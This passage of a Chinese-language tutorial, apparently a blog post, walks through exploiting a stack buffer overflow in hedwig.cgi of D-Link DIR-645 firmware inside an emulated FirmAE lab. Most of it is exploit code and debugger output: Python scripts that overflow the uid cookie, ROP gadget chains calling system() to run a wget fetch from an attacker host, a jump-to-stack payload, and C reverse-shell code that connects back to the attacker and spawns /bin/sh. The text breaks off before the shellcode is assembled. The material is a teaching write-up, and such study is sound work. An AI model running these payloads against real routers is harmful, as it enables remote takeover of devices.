+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">------------------------------</span><br><span class="line">|       FirmAE Debugger      |</span><br><span class="line">------------------------------</span><br><span class="line">1. connect to socat</span><br><span class="line">2. connect to shell</span><br><span class="line">3. tcpdump</span><br><span class="line">4. run gdbserver</span><br><span class="line">5. file transfer</span><br><span class="line">6. exit</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">4</span></span><br><span class="line">  PID USER       VSZ STAT COMMAND</span><br><span class="line">    1 root       808 S    init       </span><br><span class="line">    2 root         0 SW   [kthreadd]</span><br><span class="line">    3 root         0 SW   [ksoftirqd/0]</span><br><span class="line">....</span><br><span class="line"> 4883 root      1016 S    lld2d -c /var/lld2d.conf br0 ra0 </span><br><span class="line"> 4933 root      4976 S    httpd -f /var/run/httpd.conf </span><br><span class="line"> 6946 root      1668 S    /firmadyne/busybox sleep 5 </span><br><span class="line"> 6953 root       804 S    sleep 1 </span><br><span class="line"> 6966 root       812 R    ps </span><br><span class="line"></span><br><span class="line">[+] target pid : 4933</span><br><span class="line">[+] gdbserver at 192.168.0.1:1337 attach on 4933</span><br><span class="line">[+] run &quot;target remote 192.168.0.1:1337&quot; in host gdb-multiarch</span><br></pre></td></tr></table></figure>
+
+<p>运行 gdb-multiarch 连接路由器的调试端口，等待 CGI 请求。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set follow-fork-mode child</span><br><span class="line">set detach-on-fork off</span><br><span class="line">b *0x0040C010</span><br><span class="line">target remote 192.168.0.1:1337</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+
+<p>发送 CGI 请求，调试器中断在 <code>hedwigcgi_main()</code> 函数起始位置。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x40c010 &lt;hedwigcgi_main&gt;       lui    $gp, 0x44</span><br><span class="line">  0x40c014 &lt;hedwigcgi_main+4&gt;     addiu  $sp, $sp, -0x4e8</span><br><span class="line">  0x40c018 &lt;hedwigcgi_main+8&gt;     addiu  $gp, $gp, -0x4930</span><br><span class="line">  0x40c01c &lt;hedwigcgi_main+12&gt;    sw     $ra, 0x4e4($sp)</span><br><span class="line">  0x40c020 &lt;hedwigcgi_main+16&gt;    sw     $fp, 0x4e0($sp)</span><br><span class="line">  0x40c024 &lt;hedwigcgi_main+20&gt;    sw     $s7, 0x4dc($sp)</span><br><span class="line">  0x40c028 &lt;hedwigcgi_main+24&gt;    sw     $s6, 0x4d8($sp)</span><br><span class="line">  0x40c02c &lt;hedwigcgi_main+28&gt;    sw     $s5, 0x4d4($sp)</span><br><span class="line">  0x40c030 &lt;hedwigcgi_main+32&gt;    sw     $s4, 0x4d0($sp)</span><br><span class="line">  0x40c034 &lt;hedwigcgi_main+36&gt;    sw     $s3, 0x4cc($sp)</span><br><span class="line">  0x40c038 &lt;hedwigcgi_main+40&gt;    sw     $s2, 0x4c8($sp)</span><br></pre></td></tr></table></figure>
+
+<h3 id="控制返回"><a href="#控制返回" class="headerlink" title="控制返回"></a>控制返回</h3><p>查看 <code>hedwigcgi_main()</code> 函数的结尾代码，确定 <code>$ra</code> 寄存器的值保存在 <code>var_s24</code> 中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0040C5B8 loc_40C5B8:                              # CODE XREF: hedwigcgi_main:loc_40C59C↑j</span><br><span class="line">.text:0040C5B8                 lw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:0040C5BC                 move    $v0, $s7</span><br><span class="line">.text:0040C5C0                 lw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">.text:0040C5C4                 lw      $s7, 0x4C0+var_s1C($sp)</span><br><span class="line">.text:0040C5C8                 lw      $s6, 0x4C0+var_s18($sp)</span><br><span class="line">.text:0040C5CC                 lw      $s5, 0x4C0+var_s14($sp)</span><br><span class="line">.text:0040C5D0                 lw      $s4, 0x4C0+var_s10($sp)</span><br><span class="line">.text:0040C5D4                 lw      $s3, 0x4C0+var_sC($sp)</span><br><span class="line">.text:0040C5D8                 lw      $s2, 0x4C0+var_s8($sp)</span><br><span class="line">.text:0040C5DC                 lw      $s1, 0x4C0+var_s4($sp)</span><br><span class="line">.text:0040C5E0                 lw      $s0, 0x4C0+var_s0($sp)</span><br><span class="line">.text:0040C5E4                 jr      $ra</span><br><span class="line">.text:0040C5E8                 addiu   $sp, 0x4E8</span><br></pre></td></tr></table></figure>
+
+<p>根据 <code>hedwigcgi_main()</code> 函数的栈空间布局可知，数组 <code>xml_path</code> 的起始地址距离 <code>var_s24</code> 的偏移为 0x424 字节。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-00000400 xml_path:       .byte 1024 dup(?)</span><br><span class="line">+00000000 var_s0:         .word ?</span><br><span class="line">+00000004 var_s4:         .word ?</span><br><span class="line">+00000008 var_s8:         .word ?</span><br><span class="line">+0000000C var_sC:         .word ?</span><br><span class="line">+00000010 var_s10:        .word ?</span><br><span class="line">+00000014 var_s14:        .word ?</span><br><span class="line">+00000018 var_s18:        .word ?</span><br><span class="line">+0000001C var_s1C:        .word ?</span><br><span class="line">+00000020 var_s20:        .word ?</span><br><span class="line">+00000024 var_s24:        .word ?</span><br></pre></td></tr></table></figure>
+
+<p>因为拼接后的 <code>xml_path</code> 以 <code>/runtime/session/</code> 开头，所以实际需要填充 0x413 字节用于覆盖 <code>$pc</code> 寄存器。</p>
+<p>编写测试脚本，用于覆盖 <code>$pc</code> 寄存器。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x413</span></span><br><span class="line">payload += <span class="string">&#x27;BBBB&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.0.1/hedwig.cgi&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;uid=&#x27;</span> + payload</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, headers=headers, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 <code>$pc</code> 寄存器被覆盖为指定的内容。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*S0   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S1   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S2   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S3   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S4   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S5   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S6   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S7   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S8   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line"> GP   0x43b6d0</span><br><span class="line"> FP   0x7fff6760 ◂— &#x27;/postxml&#x27;</span><br><span class="line"> SP   0x7fff6760 ◂— &#x27;/postxml&#x27;</span><br><span class="line">*PC   0x42424242 (&#x27;BBBB&#x27;)</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / mips / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x42424242</span><br></pre></td></tr></table></figure>
+
+<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>通过调用 libc 库中的 system 函数，可以实现执行任意命令的功能。</p>
+<p>查看 cgibin 文件的保护情况。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec htdocs/cgibin</span></span><br><span class="line">[*] &#x27;/home/person/Files/_DIR645A1_FW103B11.bin.extracted/squashfs-root/htdocs/cgibin&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>查看 libuClibc-0.9.30.1.so 文件的保护情况。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec lib/libuClibc-0.9.30.1.so</span></span><br><span class="line">[*] &#x27;/home/person/Files/_DIR645A1_FW103B11.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>虽然 libuClibc-0.9.30.1.so 文件开启了 PIE 保护机制，但是仿真环境已经关闭系统地址随机化机制，所以可以忽略处理。</p>
+<p>在调试器中查看 cgibin 进程的内存布局，其中 libuClibc-0.9.30.1.so 模块的加载基址为 0x77F34000。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     Start        End Perm     Size Offset File</span><br><span class="line">  0x400000   0x423000 r-xp    23000      0 /htdocs/cgibin</span><br><span class="line">  0x433000   0x434000 rw-p     1000  23000 /htdocs/cgibin</span><br><span class="line">  0x434000   0x437000 rwxp     3000      0 [heap]</span><br><span class="line">0x77f34000 0x77f92000 r-xp    5e000      0 /lib/libuClibc-0.9.30.1.so</span><br><span class="line">0x77f92000 0x77fa1000 ---p     f000      0 [anon_77f92]</span><br><span class="line">0x77fa1000 0x77fa2000 r--p     1000  5d000 /lib/libuClibc-0.9.30.1.so</span><br><span class="line">0x77fa2000 0x77fa3000 rw-p     1000  5e000 /lib/libuClibc-0.9.30.1.so</span><br><span class="line">0x77fa3000 0x77fa8000 rw-p     5000      0 [anon_77fa3]</span><br><span class="line">0x77fa8000 0x77fd1000 r-xp    29000      0 /lib/libgcc_s.so.1</span><br><span class="line">0x77fd1000 0x77fe1000 ---p    10000      0 [anon_77fd1]</span><br><span class="line">0x77fe1000 0x77fe2000 rw-p     1000  29000 /lib/libgcc_s.so.1</span><br><span class="line">0x77fe2000 0x77fe7000 r-xp     5000      0 /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">0x77ff5000 0x77ff6000 rw-p     1000      0 [anon_77ff5]</span><br><span class="line">0x77ff6000 0x77ff7000 r--p     1000   4000 /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">0x77ff7000 0x77ff8000 rw-p     1000   5000 /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">0x7ffd6000 0x7fff7000 rwxp    21000      0 [stack]</span><br><span class="line">0x7fff7000 0x7fff8000 r-xp     1000      0 [vdso]</span><br></pre></td></tr></table></figure>
+
+<p>使用 ROPgadget 在 libuClibc-0.9.30.1.so 中查找合适的利用代码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary libuClibc-0.9.30.1.so | grep <span class="string">&quot;move \$t9, \$s0 ; jalr \$t9 ;&quot;</span></span></span><br><span class="line">....</span><br><span class="line">0x000159cc : addiu $s5, $sp, 0x10 ; move $a1, $s3 ; move $a2, $s1 ; move $t9, $s0 ; jalr $t9 ; move $a0, $s5</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>将准备执行的命令写入 <code>$sp + 0x10</code> 指向的地址，而 system 函数地址则存放在 <code>$s0</code> 寄存器中，这样便可以调用 system 函数执行指定的命令。</p>
+<p>在 libuClibc-0.9.30.1.so 中查找 <code>system()</code> 函数的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00053200                 .globl system  # weak</span><br><span class="line">.text:00053200 system:                                  # DATA XREF: LOAD:00003324↑o</span><br><span class="line">.text:00053200                                          # LOAD:00005084↑o</span><br><span class="line">.text:00053200</span><br><span class="line">.text:00053200 var_1C          = -0x1C</span><br><span class="line">.text:00053200 var_14          = -0x14</span><br><span class="line">.text:00053200 var_C           = -0xC</span><br></pre></td></tr></table></figure>
+
+<p>由于 <code>system()</code> 函数的地址为 0x00053200，包含字符串截断符 0x00，所以需要采用间接的方式进行调用。</p>
+<p>在 MIPS 架构中，指令执行采用流水线机制，即在跳转指令执行后，其下一条指令也会执行。因此，通过利用地址加减法的方式，可以避免地址中截断符的影响。</p>
+<p>通过将利用脚本中 system 函数的地址减 1，再利用 ROP 指令加 1 的方式，就可以避免 payload 中 <code>\x00</code> 截断符的影响。</p>
+<p>查找 <code>libuClibc-0.9.30.1.so</code> 中合适的 ROP 指令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary libuClibc-0.9.30.1.so | grep <span class="string">&quot;jalr \$t9 ; addiu \$s0&quot;</span></span></span><br><span class="line">....</span><br><span class="line">0x000158c8 : move $t9, $s5 ; jalr $t9 ; addiu $s0, $s0, 1</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>编写测试脚本，执行系统命令。由于 <code>requests</code> 库不支持发送 bytes 类型数据，因此更换为 <code>http.client</code> 库进行发送。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">libc_base_addr = <span class="number">0x77F34000</span></span><br><span class="line">command = <span class="string">&#x27;wget http://192.168.0.2:8000/index.html&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x3EF</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000531FF</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000159CC</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xC</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000158C8</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += command</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.0.1&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">path = <span class="string">&#x27;/hedwig.cgi&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">b&#x27;uid=&#x27;</span> + payload</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = http.client.HTTPConnection(host, port).request(<span class="string">&#x27;POST&#x27;</span>, path, data, headers)</span><br><span class="line">r = conn.getresponse()</span><br><span class="line"><span class="built_in">print</span>(r.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>运行 NetCat 监听指定端口，接收路由器发送的 HTTP 请求。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -lvvp 8000</span></span><br><span class="line">Listening on 0.0.0.0 8000</span><br><span class="line">Connection received on 192.168.0.1 46499</span><br><span class="line">GET /index.html/postxml HTTP/1.1</span><br><span class="line">Host: 192.168.0.2:8000</span><br><span class="line">User-Agent: Wget</span><br></pre></td></tr></table></figure>
+
+<h3 id="执行代码"><a href="#执行代码" class="headerlink" title="执行代码"></a>执行代码</h3><p>通过将目标代码写入栈中内存，然后跳转到栈上执行的方式，可以实现执行任意代码的功能。</p>
+<p>通过之前的 gadget 代码，可以控制程序跳转到栈中地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x000159cc : addiu $s5, $sp, 0x10 ; move $a1, $s3 ; move $a2, $s1 ; move $t9, $s0 ; jalr $t9 ; move $a0, $s5</span><br><span class="line">0x000158c8 : move $t9, $s5 ; jalr $t9 ; addiu $s0, $s0, 1</span><br></pre></td></tr></table></figure>
+
+<p>将目标代码写入 <code>$sp + 0x10</code> 指向的内存空间，依次经过 0x000159CC 和 0x000158C8 地址指令的执行，最终可以跳转到栈中执行目标代码。</p>
+<p>编写测试脚本，控制程序跳转到栈中执行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line">libc_base_addr = <span class="number">0x77F34000</span></span><br><span class="line">shellcode = <span class="string">b&#x27;BBBB&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x3EF</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000158C8</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, libc_base_addr + <span class="number">0x000159CC</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.0.1&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">path = <span class="string">&#x27;/hedwig.cgi&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">b&#x27;uid=&#x27;</span> + payload</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = http.client.HTTPConnection(host, port).request(<span class="string">&#x27;POST&#x27;</span>, path, data, headers)</span><br><span class="line">r = conn.getresponse()</span><br><span class="line"><span class="built_in">print</span>(r.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 <code>$pc</code> 寄存器指向了栈空间地址，并提示此处为无效指令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*S0   0x77f498c9 ◂— j 0x740a8320</span><br><span class="line">*S1   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S2   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S3   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S4   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S5   0x7fff6760 ◂— &#x27;BBBB/postxml&#x27;</span><br><span class="line">*S6   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S7   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*S8   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line"> GP   0x43b6d0</span><br><span class="line">*FP   0x0</span><br><span class="line"> SP   0x7fff6750 ◂— &#x27;AAAAAAAAAAAAAAAABBBB/postxml&#x27;</span><br><span class="line">*PC   0x7fff6760 ◂— &#x27;BBBB/postxml&#x27;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / mips / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Invalid instructions at 0x7fff6760</span><br></pre></td></tr></table></figure>
+
+<p>编写实现交互 Shell 的代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建 UDP 套接字</span></span><br><span class="line">    <span class="type">int</span> s = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重定向标准输入流</span></span><br><span class="line">    dup2(s, <span class="number">0</span>);</span><br><span class="line">    dup2(s, <span class="number">1</span>);</span><br><span class="line">    dup2(s, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 与攻击机建立连接</span></span><br><span class="line">    SOCKADDR_IN s_addr;</span><br><span class="line">    s_addr.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.0.2&quot;</span>);</span><br><span class="line">    s_addr.sin_family = AF_INET;</span><br><span class="line">    s_addr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line">    connect(s, (SOCKADDR*)s_addr, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现交互式 Shell</span></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>], <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转换为 mips32 架构的汇编代码。</p>
